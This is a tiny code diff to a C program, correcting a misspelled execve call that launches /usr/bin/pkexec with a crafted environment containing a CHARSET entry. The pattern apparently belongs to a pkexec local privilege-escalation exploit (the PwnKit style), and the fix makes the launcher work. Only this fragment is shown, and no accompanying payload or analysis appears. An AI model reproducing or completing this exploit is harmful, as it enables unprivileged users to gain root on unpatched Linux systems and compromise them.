@@ -9,7 +9,7 @@ int main() {
         "CHARSET=FUCKYOU",
         NULL};
 
-    execev("/usr/bin/pkexec", argv, envp);
+    execve("/usr/bin/pkexec", argv, envp);
     return 0;
 }
 
